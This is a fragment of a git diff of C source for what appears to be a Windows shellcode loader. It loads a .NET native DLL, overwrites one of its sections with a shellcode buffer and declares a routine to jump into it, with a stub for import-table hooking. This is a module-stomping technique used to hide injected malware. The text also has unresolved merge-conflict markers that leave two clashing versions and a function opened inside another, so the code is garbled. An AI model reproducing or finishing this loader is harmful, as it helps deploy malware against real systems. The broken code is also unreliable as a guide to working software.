@@ -11,7 +11,21 @@ EXTERN_C PVOID sjump(IN PVOID shellcode_address);
 
 BOOL go(HINSTANCE hinstDll) {
 
+<<<<<<< HEAD
     HMODULE hmod = LoadLibraryA("System.Xml.ni.dll");
+=======
+
+void hook_iat(HMODULE hMod) {
+
+    LPVOID imageBase = GetModuleHandleA(NULL);
+
+
+}
+
+int main(int argc, char ** argv) {
+
+    HMODULE hmod = LoadLibraryA("System.Private.CoreLib.dll");
+>>>>>>> 014a06d99de53fa46a3ac11eb4c13a538111af76
 
     if (hmod == NULL) {
         // printf("Failed to load library\n");
@@ -50,6 +64,7 @@ BOOL go(HINSTANCE hinstDll) {
                 section_base[i] = shellcode->buf[i];
             }
 
+<<<<<<< HEAD
             // Get a pointer to the exe that loaded us
             LPVOID image_base = GetModuleHandleA(NULL);
 
@@ -108,6 +123,11 @@ BOOL go(HINSTANCE hinstDll) {
                     }
                 }
             }
+=======
+            // Jump to the section
+            // ((void (*)(void))sectionBase)();
+            // sjump(sectionBase);
+>>>>>>> 014a06d99de53fa46a3ac11eb4c13a538111af76
         }
     }
     return FALSE;
